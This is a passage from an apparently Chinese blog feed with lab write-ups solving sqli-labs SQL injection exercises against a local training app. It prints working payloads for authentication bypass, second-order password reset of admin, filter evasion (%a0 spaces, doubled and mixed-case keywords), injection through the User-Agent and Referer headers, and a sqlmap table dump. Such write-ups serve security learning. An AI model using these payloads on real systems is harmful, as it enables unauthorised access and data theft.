srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512140810273_huebf7869fb04f3ba97fd6e793e4b2c787_37392_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512140810273_huebf7869fb04f3ba97fd6e793e4b2c787_37392_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512140810273"
class="gallery-image"
data-flex-grow="307"
data-flex-basis="738px"
>&lt;/p>
&lt;p>立刻注意到&lt;code>mysql_escape_string&lt;/code>，可能存在宽字符注入的问题，但和 second-order injection 好像搭不上关系，继续往下看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512141813442.png"
width="854"
height="283"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512141813442_hu11baa8e074c48d8282ad32919836a806_42044_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512141813442_hu11baa8e074c48d8282ad32919836a806_42044_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512141813442"
class="gallery-image"
data-flex-grow="301"
data-flex-basis="724px"
>&lt;/p>
&lt;p>并无特别之处。继续看登陆。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512142053554.png"
width="868"
height="428"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512142053554_huc050794fffb5892bb09f836cbad175b3_57123_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512142053554_huc050794fffb5892bb09f836cbad175b3_57123_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512142053554"
class="gallery-image"
data-flex-grow="202"
data-flex-basis="486px"
>&lt;/p>
&lt;p>发现问题了。登陆成功应该设置 &lt;code>Auth&lt;/code> 这个 cookie 但我没找到。&lt;code>Location&lt;/code> 这个 HTTP 头也没有出现在响应里。这肯定不是正常的挑战，不审阅代码根本看不到这有个 &lt;code>Auth&lt;/code> cookie 要设置，还有登陆成功后跳转的位置是 &lt;code>logged-in.php&lt;/code>。&lt;/p>
&lt;p>看起来是 sqli-labs 自己的 bug。页面上有几个 PHP 的警告：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512142824705.png"
width="1682"
height="137"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512142824705_hud2604bbbf213c899bb5235f8daa2f6d6_23424_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512142824705_hud2604bbbf213c899bb5235f8daa2f6d6_23424_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512142824705"
class="gallery-image"
data-flex-grow="1227"
data-flex-basis="2946px"
>&lt;/p>
&lt;p>尝试修复。&lt;/p>
&lt;ol>
&lt;li>把&lt;code>Less-24/login.php&lt;/code>的&lt;code>&amp;lt;?php&lt;/code>标签放到最前，&lt;code>html&lt;/code>改成&lt;code>echo &amp;lt;&amp;lt;&amp;lt;END&lt;/code> heredoc 形式，放到登陆失败的 &lt;code>else&lt;/code> 分支里。&lt;/li>
&lt;li>把&lt;code>sql-connections/sql-connect.php&lt;/code>的&lt;code>?&amp;gt;&lt;/code>删除&lt;/li>
&lt;li>把&lt;code>sql-connections/db-creds.inc&lt;/code>的&lt;code>?&amp;gt;&lt;/code>删除&lt;/li>
&lt;/ol>
&lt;p>这和 php 如何发起 HTTP 响应有关系，HTTP 头只能出现在 body 前，如果解释器先遇到了 HTML 或者别的输出语句，那写 body 之前肯定是先把 header 给写完了。开始输出 body 部分后再调用 &lt;code>setcookie&lt;/code> 或 &lt;code>header&lt;/code> 就已经太迟了，HTTP 头已经发给客户端了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512144304913.png"
width="1092"
height="566"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512144304913_hu4b244e74ae756690a2ee967cb6036017_186825_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512144304913_hu4b244e74ae756690a2ee967cb6036017_186825_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512144304913"
class="gallery-image"
data-flex-grow="192"
data-flex-basis="463px"
>&lt;/p>
&lt;p>修复后成功进入登录后界面，是个修改密码的表单。审代码前盲猜是直接用了 &lt;code>$_SESSION['username']&lt;/code> 而没转义导致 second-order injection。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512144639504.png"
width="998"
height="235"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512144639504_hu32a2e110958d35600cb55959b0f398e7_42917_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512144639504_hu32a2e110958d35600cb55959b0f398e7_42917_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512144639504"
class="gallery-image"
data-flex-grow="424"
data-flex-basis="1019px"
>&lt;/p>
&lt;p>猜对了。&lt;/p>
&lt;p>接着用&lt;code>test123'&lt;/code>这个账号登陆试试，触发报错：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512144850227.png"
width="345"
height="49"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512144850227_hu3b147c4d85e7684d5cf3be4bdfc97e87_4728_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512144850227_hu3b147c4d85e7684d5cf3be4bdfc97e87_4728_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512144850227"
class="gallery-image"
data-flex-grow="704"
data-flex-basis="1689px"
>&lt;/p>
&lt;p>这里形成的是一个 &lt;code>update&lt;/code> 注入，所以注册一个用户名为 &lt;code>test123' or username='admin&lt;/code> 的用户即可修改 admin 的密码。&lt;/p>
&lt;h2 id="less-25">Less-25&lt;/h2>
&lt;p>提示 all your &amp;lsquo;OR&amp;rsquo; and &amp;lsquo;AND&amp;rsquo; belongs to us，服务端过滤了 &lt;code>AND&lt;/code> 和 &lt;code>OR&lt;/code> 两个关键词，但 &lt;code>UNION ALL&lt;/code> 还能用。尝试 &lt;code>?id=0' union all select 1,username,3 from users where '1'='1&lt;/code> 成功。但 &lt;code>password&lt;/code> 里的 &lt;code>or&lt;/code> 也被过滤了。注意页面底部有个 hint 提示过滤后的文本是什么样。&lt;/p>
&lt;p>尝试双写 bypass &lt;code>?id=0' union all select 1,username,passwoorrd from users where '1'='1&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512151638205.png"
width="1079"
height="399"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512151638205_hu0fc571f82d87cb839b319785f54001a6_37881_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512151638205_hu0fc571f82d87cb839b319785f54001a6_37881_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512151638205"
class="gallery-image"
data-flex-grow="270"
data-flex-basis="649px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h2 id="less-26">Less-26&lt;/h2>
&lt;p>提示 all your spaces and comments belongs to us，空格和注释会被过滤。&lt;/p>
&lt;ul>
&lt;li>&lt;code>?id=1';--%20&lt;/code>，发现&lt;code>--&lt;/code>被过滤&lt;/li>
&lt;li>&lt;code>?id=1';%23&lt;/code>，发现&lt;code>#&lt;/code>被过滤&lt;/li>
&lt;li>&lt;code>?id=1';/*&lt;/code>，发现&lt;code>/*&lt;/code>被过滤。&lt;/li>
&lt;/ul>
&lt;p>三种注释符都被过滤了，尝试双写绕过。&lt;code>?id=1';//**&lt;/code> 依然被过滤。这就蛋疼了。审一下代码吧。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512154804832.png"
width="807"
height="215"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512154804832_hu59cb45eb6baf4f616cf0bc88b3adeb2e_38223_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512154804832_hu59cb45eb6baf4f616cf0bc88b3adeb2e_38223_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512154804832"
class="gallery-image"
data-flex-grow="375"
data-flex-basis="900px"
>&lt;/p>
&lt;p>这些字符都被替换了&lt;code>/*-#\s\\&lt;/code>。经过谷歌发现一个绕过的方法，尝试用 ASCII 码表中的特殊空白符绕过。&lt;/p>
&lt;p>&lt;a class="link" href="https://www.jianshu.com/p/ff72f2c6d99c" target="_blank" rel="noopener"
>参考：Sqli-Labs：Less 26 - Less 26a&lt;/a>&lt;/p>
&lt;p>先测一遍这些特殊字符：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">echo&lt;/span> &lt;span class="nx">preg_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/\s/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;@&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;1&lt;/span>&lt;span class="se">\x09&lt;/span>&lt;span class="s2">2&lt;/span>&lt;span class="se">\x0a&lt;/span>&lt;span class="s2">3&lt;/span>&lt;span class="se">\x0c&lt;/span>&lt;span class="s2">4&lt;/span>&lt;span class="se">\x0b&lt;/span>&lt;span class="s2">5&lt;/span>&lt;span class="se">\x0d&lt;/span>&lt;span class="s2">6&lt;/span>&lt;span class="se">\xa0&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现只有&lt;code>\xa0&lt;/code>没有匹配到&lt;code>\s&lt;/code>这个正则，接着尝试 union 注入，用&lt;code>%a0&lt;/code>替代&lt;code>%20&lt;/code>。可以写个脚本把&lt;code>%00&lt;/code>到&lt;code>%ff&lt;/code>都试一遍看看哪些字符可用。&lt;/p>
&lt;p>&lt;code>\xa0&lt;/code>不在 ascii 码表内，&lt;code>latin1&lt;/code>编码中表示&lt;code>non breaking space&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">?id=0&amp;#39;%a0UNION%a0ALL%a0SELECT%a01,2,3%a0FROM%a0users%a0WHERE%a0&amp;#39;1&amp;#39;=&amp;#39;1
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512160235324.png"
width="1080"
height="410"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512160235324_hu0c21c5b5c9baab5021bff6d0bb98bef9_37435_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512160235324_hu0c21c5b5c9baab5021bff6d0bb98bef9_37435_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512160235324"
class="gallery-image"
data-flex-grow="263"
data-flex-basis="632px"
>&lt;/p>
&lt;p>注入成功。&lt;/p>
&lt;p>另外补充一下关于 AND OR 的绕过方法，使用 &lt;code>preg_replace&lt;/code> 替换的话双写就无法绕过了，但还可以考虑用逻辑运算，&lt;code>&amp;amp;&amp;amp;&lt;/code>、&lt;code>||&lt;/code>以及位运算&lt;code>|&lt;/code>、&lt;code>&amp;amp;&lt;/code>去组合条件，甚至是算数运算&lt;code>select * from users where (id=1)+(username='Dumb')=2;&lt;/code>。&lt;/p>
&lt;p>以上就是空格和&lt;code>and&lt;/code>、&lt;code>or&lt;/code>过滤的绕过方法了。注释感觉没法绕，现在没思路，暂且不谈。&lt;/p>
&lt;h2 id="less-27">Less-27&lt;/h2>
&lt;p>提示 all your union and select belongs to us ，不能使用 union 注入。测试注入&lt;code>?id=1'&lt;/code>报错有回显，字符型注入。考虑限制了 select 查别的表会比较麻烦，先试试能不能绕过 &lt;code>?id=1' uniunionon seselectlect 1,2,3&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512165506110.png"
width="576"
height="50"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512165506110_hu3e8dab28ae6c757455369233587af676_3175_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512165506110_hu3e8dab28ae6c757455369233587af676_3175_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512165506110"
class="gallery-image"
data-flex-grow="1152"
data-flex-basis="2764px"
>&lt;/p>
&lt;p>发现&lt;code>union&lt;/code>成功绕过，但&lt;code>select&lt;/code>没有幸免，同时发现空格也被过滤了。修改 payload &lt;code>?id=1'%a0uniunionon%a0SeselectLeCt%a01,2,3&lt;/code> 成功大小写绕过。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512165641965.png"
width="680"
height="54"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512165641965_hu6fd4d023623058a5158adbd868114adc_4749_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512165641965_hu6fd4d023623058a5158adbd868114adc_4749_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512165641965"
class="gallery-image"
data-flex-grow="1259"
data-flex-basis="3022px"
>&lt;/p>
&lt;p>之后就是常规操作了 &lt;code>?id=0'%a0uniunionon%a0SeselectLeCt%a01,2,3%a0from%a0users%a0where%a0'a'='a&lt;/code>，成功。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512165932026.png"
width="1100"
height="398"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512165932026_huf400eb849f98557666dff2e60091d86c_37107_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-4/image-20220512165932026_huf400eb849f98557666dff2e60091d86c_37107_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220512165932026"
class="gallery-image"
data-flex-grow="276"
data-flex-basis="663px"
>&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>page-2 难度果然比 page-1 大很多，今天只做出来5道题，每题都要想一会儿查查资料。&lt;/p>
&lt;p>几个意识到的知识点：&lt;/p>
&lt;ol>
&lt;li>直接拼接某些函数有问题，或者拼子查询有问题，可以考虑下用&lt;code>select 123 from (select ...)&lt;/code>包装一下说不定能省很多事。&lt;/li>
&lt;li>second-order injection 的概念，用户输入可能过滤很好，但另一个地方用的时候没过滤，也会造成注入。&lt;/li>
&lt;li>几种绕过过滤的方法
&lt;ol>
&lt;li>对&lt;code>and&lt;/code>、&lt;code>or&lt;/code>用运算符替代的方式绕过。但有经验的开发会屏蔽掉&lt;code>|&amp;amp;;$&lt;/code>之类的特殊字符，不一定好绕。&lt;/li>
&lt;li>对空格过滤的绕过，&lt;code>latin1&lt;/code>编码的空格&lt;code>0xa0&lt;/code>。一般开发不容易注意到&lt;code>0xa0&lt;/code>能绕过&lt;code>\s&lt;/code>正则。&lt;/li>
&lt;li>一般关键词用双写、大小写方式绕过，但不一定绕得过去，被禁用的情况下可以考虑下换别的方式。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>再补充下如何安全开发。其实很简单，用 parameterized query 或者说 prepared statement/query 。目前是最有效的防 SQL 注入的方法，彻底摆脱了上面的过滤、转义等传统攻防对抗，web App 开发者可以从 SQL 注入漏洞的无底深渊里解放出来。&lt;/p>
&lt;p>遗憾的是我随便翻了下 github 上的一些新 CMS，虽然有各种 ORM 可以用，现代 DBMS 也早支持了 parameterized query，但还有人在手动拼 SQL =。= 理由就不乱推测了。Go 的 sql 库还是很给力的，直接把 parameterized query 作为最佳实践了，就是还顶不住依然有人在拼字符串=。= 我也是大无语。&lt;/p>
&lt;p>那就到这里结束了，辛苦我自己啦！&lt;/p></description></item><item><title>sqli-labs 实验记录 #3</title><link>https://nnnewb.github.io/blog/p/sqli-labs-training-3/</link><pubDate>Wed, 11 May 2022 16:36:31 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/sqli-labs-training-3/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>从 sqli-labs 第 11 题开始。后续注入点不再是 query string，还是先拿 sqlmap 解决。题目数量很多区别较小，所以重复的思路可能就略了。&lt;/p>
&lt;h2 id="less-11">Less-11&lt;/h2>
&lt;p>Error Based 而且注入点是 POST 表单。用&lt;code>'&lt;/code>确认&lt;code>password&lt;/code>字段也有注入后，尝试手工 bypass 验证：&lt;code>' or 1=1;--&lt;/code> 注意注释符后跟一个空格，但不能在输入框写 &lt;code>%20&lt;/code>，会被转义成&lt;code>%%20&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511113730087.png"
width="802"
height="572"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511113730087_hu4bd98b42bdbe57e685502990a5a5bcab_159599_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511113730087_hu4bd98b42bdbe57e685502990a5a5bcab_159599_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511113730087"
class="gallery-image"
data-flex-grow="140"
data-flex-basis="336px"
>&lt;/p>
&lt;h2 id="less-12">Less-12&lt;/h2>
&lt;p>用&lt;code>&amp;quot;&lt;/code>测出引号类型后根据报错内容补一个右括号，最终 payload &lt;code>&amp;quot;) or 1=1;--&lt;/code> 注意空格。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511113913798.png"
width="784"
height="530"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511113913798_hu1e88a9f782066603a0a6fb459a4f17e3_159074_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511113913798_hu1e88a9f782066603a0a6fb459a4f17e3_159074_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511113913798"
class="gallery-image"
data-flex-grow="147"
data-flex-basis="355px"
>&lt;/p>
&lt;h2 id="less-13">Less-13&lt;/h2>
&lt;p>有报错，提示 double injection 。用&lt;code>'&lt;/code>测出引号类型，根据错误信息补右括号，&lt;code>') or 1=1;--&lt;/code> bypass 成功。&lt;/p>
&lt;p>也可以用上一篇博客提到的&lt;code>rand&lt;/code>+&lt;code>group by&lt;/code>报错的方式。但我是真的越来越不懂 double injection 到底是不是特指某种注入技巧了，还是说就没共识大家对 double injection 各自解释？&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511114447196.png"
width="773"
height="515"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511114447196_hucf43289805919decf00eb1fd7c21b49d_157237_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511114447196_hucf43289805919decf00eb1fd7c21b49d_157237_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511114447196"
class="gallery-image"
data-flex-grow="150"
data-flex-basis="360px"
>&lt;/p>
&lt;h2 id="less-14">Less-14&lt;/h2>
&lt;p>用&lt;code>&amp;quot;&lt;/code>测出引号类型，根据报错不用补右括号，&lt;code>&amp;quot; or 1=1;--&lt;/code> bypass 成功。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511114639716.png"
width="851"
height="561"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511114639716_hu4f41a74d132e4ef993bbd4055861bbbd_158192_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511114639716_hu4f41a74d132e4ef993bbd4055861bbbd_158192_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511114639716"
class="gallery-image"
data-flex-grow="151"
data-flex-basis="364px"
>&lt;/p>
&lt;h2 id="less-15">Less-15&lt;/h2>
&lt;p>布尔盲注，测试&lt;code>'&lt;/code>报错，&lt;code>' or 1=1;--&lt;/code> bypass 成功。&lt;/p>
&lt;p>图就略了。&lt;/p>
&lt;h2 id="less-16">Less-16&lt;/h2>
&lt;p>时间盲注，测试&lt;code>&amp;quot;&lt;/code>报错，&lt;code>&amp;quot; or sleep(1);--&lt;/code>无效，补右括号，&lt;code>&amp;quot;) or sleep(1);--&lt;/code> 有效。&lt;/p>
&lt;h2 id="less-17">Less-17&lt;/h2>
&lt;p>这次的表单是更新密码，表单内容用户名和新密码，没有错误回显。&lt;/p>
&lt;p>提示 update 注入。update 注入的 SQL 格式化参数的位置一般在 &lt;code>UPDATE tbl SET col=input col2=input ... WHERE ...&lt;/code> &lt;code>SET&lt;/code> 后面和 &lt;code>WHERE&lt;/code> 后面。这里显然 &lt;code>WHERE&lt;/code> 后面的是用户名 &lt;code>SET&lt;/code> 后面的是新密码。因为没有明确的目标，越权把 admin 用户的密码改了拉倒。&lt;/p>
&lt;p>先确认注入类型，尝试 &lt;code>admin';-- &lt;/code>、&lt;code>admin');-- &lt;/code>、&lt;code>admin&amp;quot;;-- &lt;/code>、&lt;code>admin&amp;quot;);-- &lt;/code>、&lt;code>admin'));--&lt;/code>、&lt;code>admin&amp;quot;));--&lt;/code>都无效。这就有点气人了。&lt;/p>
&lt;p>再试试密码能不能注入，&lt;code>password';--&lt;/code>，直接把后面的&lt;code>where&lt;/code>全注释掉。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511144727654.png"
width="841"
height="562"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511144727654_hufa25563151eb039af331c645b7a1808f_251245_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511144727654_hufa25563151eb039af331c645b7a1808f_251245_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511144727654"
class="gallery-image"
data-flex-grow="149"
data-flex-basis="359px"
>&lt;/p>
&lt;p>直连 MySQL 验证确认注入生效。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511144801988.png"
width="476"
height="378"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511144801988_hu5fdde7b43b72f56a9f1f2b3c90b53817_165388_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511144801988_hu5fdde7b43b72f56a9f1f2b3c90b53817_165388_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511144801988"
class="gallery-image"
data-flex-grow="125"
data-flex-basis="302px"
>&lt;/p>
&lt;p>另外也可以用 error based 方式在密码这里注入，爆出 admin 的密码，子查询就行。&lt;/p>
&lt;h2 id="less-18">Less-18&lt;/h2>
&lt;p>提示 Header Injection，尝试正常密码登陆 &lt;code>admin&lt;/code>、&lt;code>password&lt;/code> 成功。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511145044686.png"
width="1326"
height="455"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511145044686_hu40d444a12dac525d8bc65febeb216a4e_167436_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-3/image-20220511145044686_hu40d444a12dac525d8bc65febeb216a4e_167436_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220511145044686"
class="gallery-image"
data-flex-grow="291"
data-flex-basis="699px"
>&lt;/p>
&lt;p>界面上分别是 IP 地址和 UA，没有更多提示，也没找到自定义 HTTP 头，所以初步怀疑注入点是在 UA 里。可以选择用 httpie 或者 curl 发个请求测试。我用 httpie 试下。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">http --form POST &lt;span class="s1">&amp;#39;http://localhost/Less-18/&amp;#39;&lt;/span> &lt;span class="nv">uname&lt;/span>&lt;span class="o">=&lt;/span>admin &lt;span class="nv">passwd&lt;/span>&lt;span class="o">=&lt;/span>password &lt;span class="nv">submit&lt;/span>&lt;span class="o">=&lt;/span>Submit &lt;span class="s2">&amp;#34;User-Agent:sqli/1.0&amp;#39;&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>返回&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">font&lt;/span> &lt;span class="na">color&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;#0000ff&amp;#34;&lt;/span> &lt;span class="na">font&lt;/span> &lt;span class="na">size &lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">3&lt;/span> &lt;span class="p">&amp;gt;&lt;/span>Your User Agent is: sqli/1.0&amp;#39;&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">font&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;172.19.0.1&amp;#39;, &amp;#39;admin&amp;#39;)&amp;#39; at line 1&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>确认存在注入。剩下的事情就很简单了，写个 req.txt 用 &lt;code>sqlmap -r req.txt -p User-Agent -T users --dump&lt;/code>爆出用户名密码。&lt;/p>
&lt;h2 id="less-19">Less-19&lt;/h2>
&lt;p>依然是 Header Injection，提示 &lt;code>Your Referer is ...&lt;/code>，注入点应该在 &lt;code>Referer&lt;/code> 里，直接把 Less-18 的命令稍微改下。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">http --form POST &lt;span class="s1">&amp;#39;http://localhost/Less-19/&amp;#39;&lt;/span> &lt;span class="nv">uname&lt;/span>&lt;span class="o">=&lt;/span>admin &lt;span class="nv">passwd&lt;/span>&lt;span class="o">=&lt;/span>password &lt;span class="nv">submit&lt;/span>&lt;span class="o">=&lt;/span>Submit &lt;span class="s2">&amp;#34;Referer:http://im.hacker/&amp;#39;&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>返回&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
